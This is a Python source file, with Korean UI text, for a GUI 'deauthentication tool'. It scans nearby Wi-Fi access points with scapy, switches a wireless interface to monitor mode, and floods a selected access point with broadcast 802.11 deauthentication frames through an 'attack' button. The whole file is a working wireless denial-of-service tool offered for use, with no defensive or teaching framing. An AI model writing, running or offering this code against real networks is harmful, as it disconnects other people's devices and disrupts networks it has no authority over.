from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt
from tkinter import *
import tkinter.messagebox as msgbox
import subprocess
import threading
import time

DEAUTH_INTERVAL = 0.005
HOP_INTERVAL = 0.5
SCAN_CHANNELS=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 36, 40, 44, 48, 149, 153, 157, 161, 165, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140]

class Hacker:
    def __init__(self):
        self.iface=None
        self.ap_list = []
        self.scanning=False

    def ap_scan(self):
        self.scanning=True
        print("주변 AP 스캔 중... ")
        sniff(iface=self.iface, prn=self.packet_handler,stop_filter=lambda pkt : not self.scanning)
        print("\n스캔 종료")
        self.scanning=False

    def packet_handler(self, pkt):
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Elt].info.decode(errors='ignore')
            bssid = pkt[Dot11].addr3
            channel = None
            elt = pkt[Dot11Elt]

            while isinstance(elt, Dot11Elt):
                # DS Parameter Set (2.4GHz 일반 채널 정보)
                if elt.ID == 3:
                    channel = elt.info[0]
                # HT Operation (5GHz 또는 HT 채널 정보)
                elif elt.ID == 61 and len(elt.info) >= 1:
                    ht_channel = elt.info[0]
                    if not channel:  # HT가 있으면 우선순위
                        channel = ht_channel
                # VHT Operation (Very High Throughput, 802.11ac)
                elif elt.ID == 192 and len(elt.info) >= 2:
                    vht_channel = elt.info[1] + 36  # 대략적인 계산 방식 (추정)
                    if not channel:
                        channel = vht_channel
                elt = elt.payload.getlayer(Dot11Elt)

            if channel is None: return

            if (ssid, bssid, channel) not in self.ap_list:
                self.ap_list.append((ssid, bssid, channel))
                print(f"SSID: {ssid}, BSSID: {bssid}, CHANNEL: {channel}")

    def is_monitor_mode(self):
        try:
            result = subprocess.check_output(["iwconfig", self.iface]).decode()
            return "Mode:Monitor" in result
        except subprocess.CalledProcessError as e:
            print(e)
            return False
        
    def set_monitor_mode(self):
        subprocess.run(
            ["sudo", "airmon-ng", "start", self.iface]
        )
        
    def deauth(self, ap, ch, ct):
        target = "ff:ff:ff:ff:ff:ff"
        dot11=Dot11(addr1=target, addr2=ap, addr3=ap)
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)


        subprocess.run(
            ["sudo", "iwconfig", self.iface, "channel", str(ch)],
            check=True
        )
        time.sleep(0.05)
        sendp(packet, iface=self.iface, count=ct, inter=DEAUTH_INTERVAL, verbose=1)

    def channel_hopping(self):
        while self.scanning:
            for ch in SCAN_CHANNELS:
                if not self.scanning: return
                subprocess.run(["sudo", "iwconfig", self.iface, "channel", str(ch)])
                time.sleep(HOP_INTERVAL)



class MainWindow(Tk,Hacker):
    def __init__(self):
        super().__init__()
        Hacker.__init__(self)

        self.geometry('420x550')
        self.resizable(False, False)
        self.title("deauthentication tool")

        self.bind("<Key>", self.handle_key)
        """
        sub_loop=threading.Thread(target=self.sub_loop_start)
        sub_loop.daemon=True
        sub_loop.start()"""

        self.set_gui()


    def set_gui(self):
        
        r=0

        Label(self, text="interface").grid(row=r, column=0,pady=10)

        self.entry_iface=Entry(self)
        self.entry_iface.grid(row=r, column=1)

        r+=1

        Button(self, text="Set Monitor Mode", command=self.monitor_btn).grid(row=r,column=0,columnspan=2)

        r+=1

        """
        self.check_target = Checkbutton(self, text="Anchor Taget")

        r+=1"""
        
        self.btn_scan = Button(self, text="AP SCAN",command=self.AP_scan_btn)
        self.btn_scan.grid(row=r,column=0,columnspan=2)

        r+=1

        Label(self, text="AP LIST").grid(row=r,column=0,columnspan=2)

        r+=1
        """

        Label(self, text="SSID").grid(row=r,column=0)
        Label(self, text="BSSID").grid(row=r,column=1)

        r+=1
        self.frame_ap_list=Frame(self)
        self.frame_ap_list.grid(row=r, column=0, columnspan=2)"""

        Label(self, text="SSID | BSSID | CH").grid(row=r, column=0, columnspan=2)

        r+=1

        scrollbar = Scrollbar(self, orient=VERTICAL)
        scrollbar.grid(row=r, column=2, sticky="ns")

        self.listbox = Listbox(
            self,
            width=50,
            height=15,
            yscrollcommand=scrollbar.set,
            selectmode=SINGLE
        )
        self.listbox.grid(row=r, column=0, columnspan=2, sticky="ns")
        scrollbar.config(command=self.listbox.yview)

        self.after(1000, self.update_ap_list)

        r+=1

        Label(self, text="deauth count").grid(row=r, column=0)

        self.entry_count=Entry(self)
        self.entry_count.grid(row=r, column=1)

        r+=1

        Button(self, text="공격",command=self.deauth_start).grid(row=r,column=0,columnspan=2)



    def handle_key(self, event):
        self.iface=self.entry_iface.get()
    """
    def sub_loop_start(self):
        packed_btn=0
        while True:
            if len(self.ap_list)>packed_btn:
                new_AP=self.ap_list[packed_btn-len(self.ap_list)]
                print(packed_btn)
                Button(self.frame_ap_list, text=new_AP[0], command=lambda i=packed_btn: self.deauth_start(i)).grid(row=packed_btn, column=0)
                Label(self.frame_ap_list, text=new_AP[1]).grid(row=packed_btn, column=1)
                packed_btn+=1
            time.sleep(1)"""

    def update_ap_list(self):   
        """ap_list에 새로 들어온 항목을 Listbox에 추가"""
        cur_size = self.listbox.size()
        if len(self.ap_list) > cur_size:
            for ssid, bssid, ch in self.ap_list[cur_size:]:
                display = f"{ssid or '<hidden>'} | {bssid} | {ch}"
                self.listbox.insert(END, display)
        self.after(1000, self.update_ap_list)

    def AP_scan_btn(self):
        if not self.iface:
            msgbox.showerror("","인터페이스를 입력해주세요")
            return
        if not self.is_monitor_mode():
            msgbox.showerror("","인터페이스가 모니터 모드가 아닙니다.")
            return
        thread = threading.Thread(target=self.ap_scan)
        thread.start()

        thread_channel_hopping = threading.Thread(target=self.channel_hopping)
        thread_channel_hopping.start()

        self.btn_scan.config(text="스캔 종료", command=self.stop_scan, background="red")
        msgbox.showinfo("","주변 AP 스캔 시작")


    def stop_scan(self):
        self.scanning=False
        self.btn_scan.config(text="AP SCAN", command=self.AP_scan_btn, background="LightGrey")

    def deauth_start(self):
        if not self.entry_count.get().isnumeric():
            msgbox.showerror("","공격 횟수를 정확히 입력하세요.")
            return
        if self.scanning:
            msgbox.showerror("","스캔중입니다.")
            return
        if not self.listbox.curselection():
            msgbox.showerror("","AP를 선택해 주세요.")
            return
        index=self.listbox.curselection()[0]
        ssid=self.ap_list[index][0]
        ap=self.ap_list[index][1]
        ch=self.ap_list[index][2]
        ct=int(self.entry_count.get())

        print(ch)

        thread=threading.Thread(target=self.deauth, args=(ap,ch,ct))
        thread.start()
        msgbox.showinfo("",f"{ssid}에게 공격 시작")

    def monitor_btn(self):
        if not self.iface:
            msgbox.showerror("","인터페이스를 입력해주세요")
            return
        self.set_monitor_mode()

        if not self.is_monitor_mode():
            msgbox.showerror("","모니터모드 변경 실패")
            return



if __name__=="__main__":
    app = MainWindow()
    app.mainloop()